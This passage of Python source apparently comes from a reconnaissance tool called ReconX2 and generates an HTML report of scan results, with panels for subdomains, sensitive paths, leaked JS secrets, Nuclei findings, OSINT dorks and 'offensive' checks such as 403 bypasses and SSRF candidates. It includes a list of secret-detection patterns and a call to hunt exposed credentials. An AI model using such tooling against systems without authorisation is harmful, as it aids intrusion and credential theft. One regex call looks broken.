                    '<div class="ss-t">No Screenshots Captured</div>'
                    f'<div class="ss-s">gowitness: <code>{gw_p}</code><br>'
                    f'chromium: <code>{chr_p}</code><br><br>'
                    f'Manual: <code>gowitness scan file -f live_urls.txt --screenshot-path screenshots/ --chrome-path {chr_p}</code>'
                    '</div></div>'
                )
            import base64

            def fname_to_url(fname):
                """Parse host URL from gowitness/chromium screenshot filename."""
                name = re.sub(r'\.(png|jpg|jpeg)$', '', fname, flags=re.I)
                # gowitness v3: https.host.name.com.png → https://host.name.com
                if re.match(r'^https?\.',name):
                    proto, rest = name.split('.', 1)
                    return f"{proto}://{rest}", rest
                # gowitness v2: https-host-com-443.png → https://host.com
                if re.match(r'^https?-', name):
                    parts = name.split('-')
                    proto = parts[0]
                    # remove port at end if numeric
                    host_parts = parts[1:-1] if parts[-1].isdigit() else parts[1:]
                    return f"{proto}://{'.' .join(host_parts)}", '.'.join(host_parts)
                # chromium: https___host_com.png → https://host.com
                clean = re.sub(r'^https?_+','',name,'').replace('_','.')
                return f"https://{clean}", clean

            cards = []
            for fname in ss_files:
                fp = os.path.join(ss_dir, fname)
                try:
                    url, host = fname_to_url(fname)
                except Exception:
                    url, host = "#", fname[:40]
                try:
                    with open(fp, "rb") as imgf:
                        b64 = base64.b64encode(imgf.read()).decode()
                    ext = "jpeg" if fname.lower().endswith((".jpg",".jpeg")) else "png"
                    src_attr = f"data:image/{ext};base64,{b64}"
                    size_kb  = os.path.getsize(fp) // 1024
                except Exception:
                    src_attr = ""
                    size_kb  = 0
                if src_attr:
                    cards.append(
                        '<div class="ss-card" onclick="openLB(this)"'
                        f' data-host="{host}" data-url="{url}">'
                        f'<img src="{src_attr}" alt="{host}" loading="lazy">'
                        '<div class="ss-info">'
                        f'<div class="ss-host">{host[:48]}</div>'
                        '<div class="ss-meta2">'
                        f'<a href="{url}" target="_blank" onclick="event.stopPropagation()" class="ss-link">&#8599; Open</a>'
                        f'<span class="ss-size">{size_kb}KB</span>'
                        '</div></div></div>'
                    )
            if not cards:
                return '<p style="color:var(--tx3);padding:20px">Screenshots could not be embedded.</p>'
            header = (
                f'<div class="ss-header">'
                f'<span class="ct">{len(cards)} captured</span>'
                f'<span class="tag" style="margin-left:8px">via {ss_tool}</span>'
                f'<span class="tag" style="margin-left:8px">click to zoom</span>'
                f'</div>'
            )
            return header + '<div class="ss-grid">' + ''.join(cards) + '</div>'


        unconf_html = ""
        if n_unconf > 0:
            unconf_html = (
                f'<div class="notice nw"><strong>Note:</strong> {n_unconf} paths '
                f'returned HTTP 429 (WAF rate-limit) and are unconfirmed. Verify manually.</div>'
            )

        # Count URL sources
        wb_c  = self.db.count("urls","source='wayback' OR source='wayback-cdx'")
        gau_c = self.db.count("urls","source='gau'")
        kat_c = self.db.count("urls","source='katana'")
        otx_c = self.db.count("urls","source='otx'")
        cc_c  = self.db.count("urls","source='commoncrawl'")
        prm_c = self.db.count("urls","has_params=1")
        sex_c = self.db.count("urls","extension IN ('.env','.sql','.bak','.zip','.key','.pem','.log')")

        CSS = """@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg0:#05090f;--bg1:#080e18;--bg2:#0c1420;--bg3:#101a28;
  --b1:#162030;--b2:#1e2e42;--b3:#2a3f58;
  --cy:#00c8ff;--cy2:#0099cc;--cy3:#66d9ff;
  --gn:#00e676;--gn2:#00b85c;
  --rd:#ff3d57;--rd2:#cc2040;
  --or:#ff8c42;--yw:#ffd740;--tl:#26c6da;--pu:#ab47bc;
  --tx:#b8cfe0;--tx2:#d8ecf8;--tx3:#607080;--tx4:#304050;
  --sans:'Inter',system-ui,sans-serif;
  --mono:'JetBrains Mono',monospace;
  --r:6px;--rl:10px;
}
html{scroll-behavior:smooth}
body{background:var(--bg0);color:var(--tx);font-family:var(--sans);font-size:13.5px;line-height:1.6}
a{color:var(--cy2);text-decoration:none}a:hover{color:var(--cy)}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:var(--bg1)}
::-webkit-scrollbar-thumb{background:var(--b2);border-radius:3px}
.topbar{background:var(--bg1);border-bottom:1px solid var(--b1);height:50px;padding:0 22px;
  display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:400}
.logo{font-family:var(--mono);font-size:15px;font-weight:700;color:var(--cy);letter-spacing:1.5px;
  text-shadow:0 0 16px rgba(0,200,255,.35)}
.logo em{color:var(--gn);font-style:normal}
.logo sup{font-size:9px;color:var(--tx3);letter-spacing:0;font-weight:400}
.vbadge{background:rgba(0,200,255,.08);border:1px solid rgba(0,200,255,.2);color:var(--cy);
  font-family:var(--mono);font-size:10px;padding:2px 8px;border-radius:20px}
.scan-meta{display:flex;gap:7px;font-size:11px;font-family:var(--mono)}
.sm{background:var(--bg2);border:1px solid var(--b1);color:var(--tx3);padding:3px 10px;border-radius:20px}
.sm strong{color:var(--tx2)}
.tgt{margin-left:auto;background:rgba(0,230,118,.07);border:1px solid rgba(0,230,118,.2);
  color:var(--gn);font-family:var(--mono);font-size:12px;font-weight:600;
  padding:5px 14px;border-radius:var(--r)}
.nav{background:var(--bg1);border-bottom:1px solid var(--b1);padding:0 20px;
  display:flex;overflow-x:auto;scrollbar-width:none;
  position:sticky;top:50px;z-index:300}
.nav::-webkit-scrollbar{display:none}
.ni{padding:11px 14px;cursor:pointer;font-size:11.5px;font-weight:500;color:var(--tx3);
  border-bottom:2px solid transparent;transition:all .15s;white-space:nowrap;
  display:flex;align-items:center;gap:5px;user-select:none}
.ni:hover{color:var(--tx2)}
.ni.on{color:var(--cy);border-bottom-color:var(--cy)}
.ni.alert.on{color:var(--rd);border-bottom-color:var(--rd)}
.nb{font-family:var(--mono);font-size:10px;padding:1px 6px;border-radius:10px;
  background:rgba(0,200,255,.1);color:var(--cy)}
.ni.alert .nb{background:rgba(255,61,87,.15);color:var(--rd)}
.dot{width:5px;height:5px;border-radius:50%;flex-shrink:0}
.dc{background:var(--cy2)}.dg{background:var(--gn)}.dr{background:var(--rd)}
.dy{background:var(--yw)}.do{background:var(--or)}.dp{background:var(--pu)}
.dt2{background:var(--tl)}.dz{background:var(--tx4)}
.panel{display:none;padding:22px 26px;max-width:1560px;margin:0 auto}
.panel.on{display:block;animation:fi .12s ease}
@keyframes fi{from{opacity:0;transform:translateY(3px)}to{opacity:1;transform:translateY(0)}}
.sg{display:grid;grid-template-columns:repeat(auto-fill,minmax(138px,1fr));gap:10px;margin-bottom:18px}
.sc{background:var(--bg2);border:1px solid var(--b1);border-radius:var(--rl);
  padding:16px 13px;text-align:center;position:relative;overflow:hidden;
  transition:all .2s;cursor:default}
.sc:hover{border-color:var(--b2);transform:translateY(-1px);box-shadow:0 6px 24px rgba(0,0,0,.3)}
.sc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px}
.sc.b::after{background:linear-gradient(90deg,var(--cy2),var(--cy))}
.sc.g::after{background:linear-gradient(90deg,var(--gn2),var(--gn))}
.sc.r::after{background:linear-gradient(90deg,var(--rd2),var(--rd))}
.sc.o::after{background:linear-gradient(90deg,#b05010,var(--or))}
.sc.y::after{background:linear-gradient(90deg,#c08000,var(--yw))}
.sc.z::after{background:var(--b3)}
.sc.p::after{background:linear-gradient(90deg,#7b1fa2,var(--pu))}
.sn{font-family:var(--mono);font-size:30px;font-weight:700;line-height:1;margin-bottom:4px}
.sc.b .sn{color:var(--cy)}.sc.g .sn{color:var(--gn)}.sc.r .sn{color:var(--rd)}
.sc.o .sn{color:var(--or)}.sc.y .sn{color:var(--yw)}.sc.z .sn{color:var(--tx3)}.sc.p .sn{color:var(--pu)}
.sl{font-size:10px;color:var(--tx3);text-transform:uppercase;letter-spacing:.6px;font-weight:500}
.fgrid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
@media(max-width:720px){.fgrid{grid-template-columns:1fr}}
.fbox{background:var(--bg2);border:1px solid var(--b1);border-radius:var(--rl);padding:14px 16px}
.fbox h3{font-size:10px;font-weight:600;color:var(--tx3);text-transform:uppercase;
  letter-spacing:.7px;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--b1)}
.fr{display:flex;justify-content:space-between;align-items:center;
  padding:4px 0;border-bottom:1px solid rgba(22,32,48,.6);font-size:12.5px}
.fr:last-child{border-bottom:none}
.fr .lbl{color:var(--tx3)}
.fr .val{font-family:var(--mono);font-weight:700;font-size:13px}
.fr .val.r{color:var(--rd)}.fr .val.o{color:var(--or)}.fr .val.y{color:var(--yw)}
.fr .val.g{color:var(--gn)}.fr .val.c{color:var(--cy)}
.tc{display:grid;grid-template-columns:1fr 1fr;gap:14px}
@media(max-width:860px){.tc{grid-template-columns:1fr}}
.sh{display:flex;align-items:center;gap:10px;margin:20px 0 9px;
  border-left:3px solid var(--cy2);padding-left:11px}
.sh h2{font-size:13.5px;font-weight:600;color:var(--tx2)}
.ct{font-size:10px;font-family:var(--mono);background:rgba(0,168,216,.1);
  border:1px solid rgba(0,168,216,.18);color:var(--cy2);padding:2px 8px;border-radius:20px}
.tw{overflow-x:auto;border-radius:var(--rl);border:1px solid var(--b1);margin-top:8px}
.dt{width:100%;border-collapse:collapse;font-size:12.5px}
.dt thead th{background:var(--bg2);color:var(--tx3);padding:9px 13px;text-align:left;
  border-bottom:1px solid var(--b2);font-size:10.5px;font-weight:500;
  text-transform:uppercase;letter-spacing:.5px;white-space:nowrap}
.dt tbody td{padding:8px 13px;border-bottom:1px solid rgba(22,32,48,.5);
  color:var(--tx2);vertical-align:middle}
.dt tbody tr:last-child td{border-bottom:none}
.dt tbody tr:hover td{background:rgba(0,200,255,.025)}
.dt td.num{color:var(--tx4);font-family:var(--mono);font-size:10.5px;
  text-align:right;width:34px;padding-right:8px}
.dt td.mono{font-family:var(--mono);font-size:11.5px;word-break:break-all}
.dt td.uc{max-width:500px}
.dt td.dim{color:var(--tx3);font-size:11.5px}
.empty{text-align:center;padding:28px!important;color:var(--tx3);font-style:italic}
.cb{font-family:var(--mono);font-size:10.5px;font-weight:700;padding:2px 7px;border-radius:4px}
.c2{background:rgba(0,192,96,.14);color:#00e676;border:1px solid rgba(0,192,96,.28)}
.c3{background:rgba(255,215,64,.11);color:#ffd740;border:1px solid rgba(255,215,64,.22)}
.c4{background:rgba(255,140,66,.11);color:#ff8c42;border:1px solid rgba(255,140,66,.22)}
.c5{background:rgba(255,61,87,.14);color:#ff3d57;border:1px solid rgba(255,61,87,.28)}
.rb{font-size:10px;font-weight:700;font-family:var(--mono);padding:2px 8px;border-radius:3px;letter-spacing:.4px}
.rc{background:rgba(255,61,87,.16);color:#ff3d57;border:1px solid rgba(255,61,87,.3)}
.rh{background:rgba(255,140,66,.14);color:#ff8c42;border:1px solid rgba(255,140,66,.28)}
.rm{background:rgba(255,215,64,.11);color:#ffd740;border:1px solid rgba(255,215,64,.22)}
.rl{background:rgba(38,198,218,.11);color:#26c6da;border:1px solid rgba(38,198,218,.22)}
.ri{background:rgba(96,112,128,.14);color:#6b88a4;border:1px solid rgba(96,112,128,.2)}
.pill{font-size:10px;font-weight:600;padding:2px 7px;border-radius:20px}
.g{background:rgba(0,192,96,.11);color:var(--gn);border:1px solid rgba(0,192,96,.22)}
.y{background:rgba(255,215,64,.09);color:var(--yw);border:1px solid rgba(255,215,64,.18)}
.z{background:rgba(96,112,128,.11);color:var(--tx3);border:1px solid rgba(96,112,128,.18)}
.tag{font-size:10px;font-family:var(--mono);background:rgba(255,255,255,.04);
  border:1px solid var(--b2);color:var(--tx3);padding:1px 7px;border-radius:3px}
.ttag{display:inline-block;font-size:10px;font-family:var(--mono);
  background:rgba(171,71,188,.1);border:1px solid rgba(171,71,188,.18);
  color:#ce93d8;padding:1px 6px;border-radius:3px;margin:1px 2px 1px 0}
.xt{font-size:11px;background:rgba(255,255,255,.04);border:1px solid var(--b2);
  color:var(--tx3);padding:1px 5px;border-radius:3px}
.xt.xe{background:rgba(255,61,87,.09);border-color:rgba(255,61,87,.22);color:#ff8fa0}
.pt{background:rgba(0,200,255,.05);border:1px solid rgba(0,200,255,.13);
  color:var(--cy2);padding:1px 6px;border-radius:3px;font-size:11px}
.vt{color:var(--yw);font-weight:600;font-size:12px}
.srch{width:100%;max-width:420px;padding:7px 13px;border-radius:var(--r);
  border:1px solid var(--b2);background:var(--bg2);color:var(--tx2);
  font-size:13px;outline:none;font-family:var(--sans);margin-bottom:10px}
.srch:focus{border-color:var(--cy2);box-shadow:0 0 0 3px rgba(0,168,216,.09)}
.srch::placeholder{color:var(--tx4)}
.cc{position:relative}
.cpb{display:none;margin-left:7px;cursor:pointer;background:rgba(0,200,255,.07);
  border:1px solid rgba(0,200,255,.18);color:var(--cy);font-size:10px;
  padding:1px 6px;border-radius:3px;transition:background .12s;font-family:var(--sans)}
.cc:hover .cpb{display:inline-block}
.cpb:hover{background:rgba(0,200,255,.14)}
.cpb.ok{color:var(--gn);border-color:rgba(0,230,118,.25)}
.cab{float:right;padding:5px 13px;border-radius:var(--r);background:rgba(0,168,216,.07);
  border:1px solid rgba(0,168,216,.2);color:var(--cy2);font-size:11.5px;cursor:pointer;
  font-family:var(--sans);transition:background .12s}
.cab:hover{background:rgba(0,168,216,.13)}
.notice{padding:10px 14px;border-radius:var(--r);margin:10px 0;font-size:12.5px}
.nw{background:rgba(255,215,64,.06);border:1px solid rgba(255,215,64,.2);color:#b89800}
.ni2{background:rgba(0,168,216,.06);border:1px solid rgba(0,168,216,.16);color:var(--cy2)}
.pre{background:#030710;border:1px solid var(--b1);border-radius:var(--rl);
  padding:13px;font-family:var(--mono);font-size:11px;color:#6ec896;
  overflow:auto;white-space:pre-wrap;word-break:break-all;max-height:460px;line-height:1.65}
.ss-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(258px,1fr));gap:12px;margin-top:10px}
.ss-card{background:var(--bg2);border:1px solid var(--b1);border-radius:var(--rl);
  overflow:hidden;cursor:pointer;transition:all .2s}
.ss-card:hover{border-color:var(--cy2);transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.3)}
.ss-card img{width:100%;height:168px;object-fit:cover;display:block;
  background:var(--bg3);border-bottom:1px solid var(--b1)}
.ss-fn{padding:7px 10px;font-size:10.5px;font-family:var(--mono);
  color:var(--tx3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.ss-empty{text-align:center;padding:56px 20px;color:var(--tx3)}
.ss-t{font-size:15px;font-weight:600;color:var(--tx2);margin-bottom:8px}
.ss-s{font-size:12.5px;line-height:1.9}
.ss-meta{margin-bottom:10px}
.lb{display:none;position:fixed;inset:0;background:rgba(0,0,0,.93);
  z-index:9999;justify-content:center;align-items:center;cursor:zoom-out}
.lb.open{display:flex}
.lb img{max-width:96vw;max-height:92vh;border-radius:var(--rl);box-shadow:0 12px 60px rgba(0,0,0,.6)}
.lb-x{position:fixed;top:14px;right:18px;color:var(--tx2);font-size:26px;cursor:pointer;
  width:38px;height:38px;background:rgba(0,0,0,.5);border-radius:50%;
  display:flex;align-items:center;justify-content:center;border:1px solid var(--b2)}
.foot{text-align:center;padding:20px;margin-top:40px;border-top:1px solid var(--b1);
  color:var(--tx4);font-size:11px;font-family:var(--mono)}
.foot span{color:var(--tx3)}"""

        H = (
            f'<!DOCTYPE html>\n<html lang="en">\n<head>\n'
            f'<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">\n'
            f'<title>ReconX2 &mdash; {self.domain}</title>\n'
            f'<style>\n{CSS}\n</style>\n</head>\n<body>\n\n'

            # TOPBAR
            f'<div class="topbar">'
            f'<div class="logo">RECON<em>X</em>2<sup>by {AUTHOR}</sup></div>'
            f'<div class="vbadge">v{VERSION}</div>'
            f'<div class="scan-meta">'
            f'<div class="sm">scan <strong>{ts}</strong></div>'
            f'<div class="sm">time <strong>{dur_str}</strong></div>'
            f'</div>'
            f'<div class="tgt">&#9675; {self.domain}</div>'
            f'<div class="vbadge" style="background:rgba(255,61,87,.12);border-color:rgba(255,61,87,.3);color:#ff3d57">Risk: {self.db.get_meta("risk_score","?")}/100</div>'
            f'</div>\n\n'

            # NAV
            f'<nav class="nav" id="nav">'
            f'<div class="ni on" data-p="summary"><span class="dot dc"></span>Summary</div>'
            f'<div class="ni" data-p="subdomains"><span class="dot dc"></span>Subdomains<span class="nb">{n_subs}</span></div>'
            f'<div class="ni" data-p="live"><span class="dot dg"></span>Live Hosts<span class="nb">{n_live}</span></div>'
            f'<div class="ni" data-p="urls"><span class="dot dc"></span>URLs<span class="nb">{n_urls}</span></div>'
            f'<div class="ni alert" data-p="sensitive"><span class="dot dr"></span>Sensitive<span class="nb">{n_sens}</span></div>'
            f'<div class="ni" data-p="js"><span class="dot dy"></span>JS Files<span class="nb">{n_js}</span></div>'
            f'<div class="ni" data-p="params"><span class="dot dt2"></span>Params<span class="nb">{n_params}</span></div>'
            f'<div class="ni" data-p="nuclei"><span class="dot dr"></span>Nuclei<span class="nb">{n_nuc}</span></div>'
            f'<div class="ni" data-p="tech"><span class="dot dp"></span>Tech</div>'
            f'<div class="ni" data-p="dns"><span class="dot dt2"></span>DNS &amp; SSL</div>'
            f'<div class="ni" data-p="dorks"><span class="dot do"></span>OSINT</div>'
            f'<div class="ni" data-p="screenshots"><span class="dot dg"></span>Screenshots<span class="nb">{n_shots}</span></div>'
            f'<div class="ni" data-p="execsummary"><span class="dot dr"></span>Exec Summary</div>'
            f'<div class="ni alert" data-p="phase1"><span class="dot dr"></span>Offensive<span class="nb">{n_403bp+n_cors+n_redir+n_buck+n_gql+n_idor+n_ssrf+n_domxss+n_jwt+n_defcr+n_rl+n_crlf+n_pp}</span></div>'
            f'</nav>\n\n'

            # SUMMARY PANEL
            f'<div class="panel on" id="p-summary">\n'
            f'<div class="sg">'
            f'<div class="sc b"><div class="sn">{n_subs}</div><div class="sl">Subdomains</div></div>'
            f'<div class="sc g"><div class="sn">{n_live}</div><div class="sl">Live Hosts</div></div>'
            f'<div class="sc b"><div class="sn">{n_urls}</div><div class="sl">URLs</div></div>'
            f'<div class="sc y"><div class="sn">{n_js}</div><div class="sl">JS Files</div></div>'
            f'<div class="sc b"><div class="sn">{n_params}</div><div class="sl">Parameters</div></div>'
            f'<div class="sc r"><div class="sn">{n_crit}</div><div class="sl">Critical</div></div>'
            f'<div class="sc o"><div class="sn">{n_high}</div><div class="sl">High</div></div>'
            f'<div class="sc y"><div class="sn">{n_med}</div><div class="sl">Medium</div></div>'
            f'<div class="sc r"><div class="sn">{n_nuc}</div><div class="sl">Nuclei</div></div>'
            f'<div class="sc r"><div class="sn">{n_sec_js}</div><div class="sl">JS Secrets</div></div>'
            f'<div class="sc g"><div class="sn">{n_shots}</div><div class="sl">Screenshots</div></div>'
            f'<div class="sc z"><div class="sn">{n_unconf}</div><div class="sl">Unconfirmed</div></div>'
            f'<div class="sc r"><div class="sn">{risk_score_val}</div><div class="sl">Risk Score</div></div>'
            f'<div class="sc r"><div class="sn">{n_403bp}</div><div class="sl">403 Bypasses</div></div>'
            f'<div class="sc r"><div class="sn">{n_cors}</div><div class="sl">CORS Issues</div></div>'
            f'<div class="sc o"><div class="sn">{n_redir}</div><div class="sl">Open Redirects</div></div>'
            f'<div class="sc r"><div class="sn">{n_buck}</div><div class="sl">S3/Cloud Buckets</div></div>'
            f'<div class="sc o"><div class="sn">{n_gql}</div><div class="sl">GraphQL Exposed</div></div>'
            f'<div class="sc o"><div class="sn">{n_idor}</div><div class="sl">IDOR Candidates</div></div>'
            f'</div>\n'
            f'{unconf_html}\n'
            f'<div class="fgrid">'
            f'<div class="fbox"><h3>Attack Surface</h3>'
            f'<div class="fr"><span class="lbl">Subdomains</span><span class="val c">{n_subs}</span></div>'
            f'<div class="fr"><span class="lbl">Live &amp; Responding</span><span class="val g">{n_live}</span></div>'
            f'<div class="fr"><span class="lbl">Total URLs</span><span class="val c">{n_urls}</span></div>'
            f'<div class="fr"><span class="lbl">JS Files</span><span class="val y">{n_js}</span></div>'
            f'<div class="fr"><span class="lbl">Parameters</span><span class="val c">{n_params}</span></div>'
            f'<div class="fr"><span class="lbl">Screenshots</span><span class="val g">{n_shots}</span></div>'
            f'</div>'
            f'<div class="fbox"><h3>Risk Summary</h3>'
            f'<div class="fr"><span class="lbl">Critical Findings</span><span class="val r">{n_crit}</span></div>'
            f'<div class="fr"><span class="lbl">High Findings</span><span class="val o">{n_high}</span></div>'
            f'<div class="fr"><span class="lbl">Medium Findings</span><span class="val y">{n_med}</span></div>'
            f'<div class="fr"><span class="lbl">Nuclei Critical</span><span class="val r">{n_nuc_c}</span></div>'
            f'<div class="fr"><span class="lbl">Nuclei High</span><span class="val o">{n_nuc_h}</span></div>'
            f'<div class="fr"><span class="lbl">JS Secrets</span><span class="val r">{n_sec_js}</span></div>'
            f'</div>'
            f'<div class="fbox"><h3>IP &amp; ASN</h3>'
            f'<div class="pre" style="max-height:165px">{rp(f"{self.outdir}/dns/ip_asn.txt")}</div></div>'
            f'<div class="fbox"><h3>Security Headers</h3>'
            f'<div class="pre" style="max-height:165px">{rp(f"{self.outdir}/tech/security_headers.txt")}</div></div>'
            f'</div>\n</div>\n\n'

            # SUBDOMAINS
            f'<div class="panel" id="p-subdomains">\n'
            f'<div class="sh"><h2>All Subdomains</h2><span class="ct">{n_subs} total</span></div>\n'
            f'<div style="display:flex;gap:10px;align-items:center;margin-bottom:10px">'
            f'<input class="srch" type="text" id="s-sub" placeholder="Filter subdomains...">'
            f'<button class="cab" onclick="cpAll()">Copy All</button></div>\n'
            f'<div class="tw"><table class="dt" id="t-sub">'
            f'<thead><tr><th>#</th><th>Subdomain</th><th>Source</th><th>Status</th></tr></thead>'
            f'<tbody>{sub_rows()}</tbody></table></div>\n</div>\n\n'

            # LIVE HOSTS
            f'<div class="panel" id="p-live">\n'
            f'<div class="sh"><h2>Live Hosts</h2><span class="ct">{n_live} responding</span></div>\n'
            f'<div class="tw"><table class="dt">'
            f'<thead><tr><th>#</th><th>Host</th><th>Status</th><th>Title</th><th>Tech</th></tr></thead>'
            f'<tbody>{live_rows()}</tbody></table></div>\n</div>\n\n'

            # URLS
            f'<div class="panel" id="p-urls">\n'
            f'<div class="sg" style="grid-template-columns:repeat(auto-fill,minmax(125px,1fr))">'
            f'<div class="sc b"><div class="sn">{wb_c}</div><div class="sl">Wayback</div></div>'
            f'<div class="sc b"><div class="sn">{gau_c}</div><div class="sl">GAU</div></div>'
            f'<div class="sc b"><div class="sn">{kat_c}</div><div class="sl">Katana</div></div>'
            f'<div class="sc b"><div class="sn">{otx_c}</div><div class="sl">OTX</div></div>'
            f'<div class="sc b"><div class="sn">{cc_c}</div><div class="sl">CommonCrawl</div></div>'
            f'<div class="sc y"><div class="sn">{prm_c}</div><div class="sl">With Params</div></div>'
            f'<div class="sc r"><div class="sn">{sex_c}</div><div class="sl">Sensitive Ext</div></div>'
            f'</div>\n'
            f'<div class="sh"><h2>All URLs</h2><span class="ct">{n_urls} total (5k shown)</span></div>\n'
            f'<input class="srch" type="text" id="s-url" placeholder="Filter URLs...">\n'
            f'<div class="tw"><table class="dt" id="t-url">'
            f'<thead><tr><th>#</th><th>URL</th><th>Type</th><th>Params</th><th>Source</th></tr></thead>'
            f'<tbody>{url_rows()}</tbody></table></div>\n</div>\n\n'

            # SENSITIVE
            f'<div class="panel" id="p-sensitive">\n'
            f'<div class="sg" style="grid-template-columns:repeat(auto-fill,minmax(125px,1fr))">'
            f'<div class="sc r"><div class="sn">{n_crit}</div><div class="sl">Critical</div></div>'
            f'<div class="sc o"><div class="sn">{n_high}</div><div class="sl">High</div></div>'
            f'<div class="sc y"><div class="sn">{n_med}</div><div class="sl">Medium</div></div>'
            f'<div class="sc z"><div class="sn">{n_unconf}</div><div class="sl">Unconfirmed</div></div>'
            f'</div>\n'
            f'{unconf_html}\n'
            f'<div class="sh"><h2>Confirmed Sensitive Paths</h2><span class="ct">{n_sens} confirmed</span></div>\n'
            f'<div class="tw"><table class="dt">'
            f'<thead><tr><th>#</th><th>Code</th><th>URL</th><th>Risk</th><th>Notes</th></tr></thead>'
            f'<tbody>{sens_rows()}</tbody></table></div>\n</div>\n\n'

            # JS
            f'<div class="panel" id="p-js">\n'
            f'<div class="sh"><h2>JavaScript Files</h2><span class="ct">{n_js} found</span></div>\n'
            f'<div class="notice ni2">46 detection patterns: AWS, Google, Stripe, Slack, GitHub, JWT, DB strings, '
            f'hardcoded passwords, internal endpoints, debug flags, source maps, GraphQL schemas.</div>\n'
            f'<div class="sg" style="grid-template-columns:repeat(auto-fill,minmax(125px,1fr))">'
            f'<div class="sc r"><div class="sn">{n_sec_js}</div><div class="sl">With Secrets</div></div>'
            f'<div class="sc b"><div class="sn">{n_js - n_sec_js}</div><div class="sl">Clean</div></div>'
            f'<div class="sc b"><div class="sn">{n_js}</div><div class="sl">Total JS</div></div>'
            f'</div>\n'
            f'<div class="tw"><table class="dt">'
            f'<thead><tr><th>#</th><th>JS File URL</th><th>Findings</th></tr></thead>'
            f'<tbody>{js_rows()}</tbody></table></div>\n'
            f'<div class="sh"><h2>Detected Secrets &amp; Tokens</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/js/grep_secrets.txt") or "No secrets detected."}</div>\n'
            f'<div class="sh"><h2>Discovered API Endpoints (from JS)</h2></div>\n'
            f'<div class="pre">{js_endpoints_text()}</div>\n'
            f'</div>\n\n'

            # PARAMS
            f'<div class="panel" id="p-params">\n'
            f'<div class="sh"><h2>Parameters</h2><span class="ct">{n_params} unique</span></div>\n'
            f'<div class="tw"><table class="dt">'
            f'<thead><tr><th>#</th><th>Count</th><th>Parameter</th><th>Potential Vulnerability</th></tr></thead>'
            f'<tbody>{param_rows()}</tbody></table></div>\n</div>\n\n'

            # NUCLEI
            f'<div class="panel" id="p-nuclei">\n'
            f'<div class="sg" style="grid-template-columns:repeat(auto-fill,minmax(125px,1fr))">'
            f'<div class="sc r"><div class="sn">{n_nuc_c}</div><div class="sl">Critical</div></div>'
            f'<div class="sc o"><div class="sn">{n_nuc_h}</div><div class="sl">High</div></div>'
            f'<div class="sc y"><div class="sn">{n_nuc_m}</div><div class="sl">Medium</div></div>'
            f'<div class="sc b"><div class="sn">{n_nuc}</div><div class="sl">Total</div></div>'
            f'</div>\n'
            f'<div class="sh"><h2>Nuclei Vulnerability Findings</h2><span class="ct">{n_nuc} total</span></div>\n'
            f'<div class="tw"><table class="dt">'
            f'<thead><tr><th>#</th><th>Severity</th><th>Template</th><th>URL</th></tr></thead>'
            f'<tbody>{nuc_rows()}</tbody></table></div>\n</div>\n\n'

            # TECH
            f'<div class="panel" id="p-tech">\n'
            f'<div class="sh"><h2>Technology Fingerprinting</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/tech/whatweb_brief.txt") or "Run: whatweb -i live_urls.txt"}</div>\n'
            f'<div class="sh"><h2>Security Headers Audit</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/tech/security_headers.txt")}</div>\n'
            f'</div>\n\n'

            # DNS & SSL
            f'<div class="panel" id="p-dns">\n'
            f'<div class="tc">'
            f'<div><div class="sh"><h2>DNS Records</h2></div>'
            f'<div class="tw"><table class="dt">'
            f'<thead><tr><th>Type</th><th>Value</th></tr></thead>'
            f'<tbody>{dns_rows()}</tbody></table></div></div>'
            f'<div><div class="sh"><h2>WHOIS</h2></div>'
            f'<div class="pre">{rp(f"{self.outdir}/dns/whois.txt")}</div></div>'
            f'</div>\n'
            f'<div class="sh"><h2>SSL / TLS Certificate</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/ssl/ssl_analysis.txt")}</div>\n'
            f'</div>\n\n'

            # DORKS
            f'<div class="panel" id="p-dorks">\n'
            f'<div class="sh"><h2>OSINT Dorks</h2></div>\n'
            f'<p style="font-size:12px;color:var(--tx3);margin-bottom:10px">'
            f'Run in Google, Shodan, GitHub to find exposed assets and credentials.</p>\n'
            f'<div class="pre">{rp(f"{self.outdir}/raw/google_dorks.txt")}</div>\n'
            f'</div>\n\n'

            # SCREENSHOTS
            f'<div class="panel" id="p-screenshots">\n'
            f'<div class="sh"><h2>Live Host Screenshots</h2>'
            f'<span class="ct">{n_shots} captured</span></div>\n'
            f'{ss_gallery()}\n</div>\n\n'

            # EXECUTIVE SUMMARY PANEL
            f'<div class="panel" id="p-execsummary">\n'
            f'<div class="sg" style="grid-template-columns:repeat(auto-fill,minmax(160px,1fr))">'
            f'<div class="sc r"><div class="sn">{risk_score_val}</div><div class="sl">Risk Score /100</div></div>'
            f'<div class="sc {'r' if risk_label_val in ['CRITICAL','HIGH'] else 'y'}"><div class="sn" style="font-size:18px">{risk_label_val}</div><div class="sl">Risk Level</div></div>'
            f'<div class="sc b"><div class="sn">{n_bb_reports}</div><div class="sl">BB Reports</div></div>'
            f'</div>\n'
            f'<div class="sh"><h2>Executive Summary</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/reports/executive_summary.md") or "Run full scan to generate."}</div>\n'
            f'<div class="sh"><h2>Scan Diff</h2></div>\n'
            f'<div class="pre">{rp(f"{self.outdir}/reports/scan_diff.md") or "No previous scan to compare."}</div>\n'
            f'</div>\n\n'
            # PHASE 1 OFFENSIVE PANEL
            f'<div class="panel" id="p-phase1">\n'
            f'<div class="sg" style="grid-template-columns:repeat(auto-fill,minmax(145px,1fr))">'
            f'<div class="sc r"><div class="sn">{n_403bp}</div><div class="sl">403 Bypasses</div></div>'
            f'<div class="sc r"><div class="sn">{n_cors}</div><div class="sl">CORS Issues</div></div>'
            f'<div class="sc o"><div class="sn">{n_redir}</div><div class="sl">Open Redirects</div></div>'
